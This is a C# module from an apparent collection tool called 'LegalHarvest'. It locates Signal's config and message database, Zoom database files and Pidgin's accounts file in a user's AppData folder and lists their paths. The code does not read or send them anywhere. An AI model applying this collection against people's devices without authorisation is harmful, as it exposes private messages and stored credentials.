using System;
using System.Collections.Generic;
using System.IO;

namespace LegalHarvest.Modules
{
    public class MessagingAppsModule : ICollectorModule
    {
        public string ModuleName => "MessagingApps";
        public bool CanExecute() => true;

        public List<CollectedItem> Collect()
        {
            var items = new List<CollectedItem>();
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            // Signal
            string signalPath = Path.Combine(appData, "Signal");
            if (Directory.Exists(signalPath))
                foreach (string dir in Directory.GetDirectories(signalPath))
                {
                    string config = Path.Combine(dir, "config.json");
                    if (File.Exists(config)) items.Add(new CollectedItem { Category = "Signal", Name = "Config", Value = config, Timestamp = DateTime.Now });
                    string db = Path.Combine(dir, "sql", "db.sqlite");
                    if (File.Exists(db)) items.Add(new CollectedItem { Category = "Signal", Name = "Database", Value = db, Timestamp = DateTime.Now });
                }

            // Zoom
            string zoomPath = Path.Combine(appData, "Zoom");
            if (Directory.Exists(zoomPath))
                foreach (string file in Directory.GetFiles(zoomPath, "*.db", SearchOption.AllDirectories))
                    items.Add(new CollectedItem { Category = "Zoom", Name = file, Value = file, Timestamp = DateTime.Now });

            // Pidgin
            string pidginPath = Path.Combine(appData, ".purple");
            if (Directory.Exists(pidginPath))
            {
                string accountsXml = Path.Combine(pidginPath, "accounts.xml");
                if (File.Exists(accountsXml)) items.Add(new CollectedItem { Category = "Pidgin", Name = "Accounts", Value = accountsXml, Timestamp = DateTime.Now });
            }

            return items;
        }
    }
}
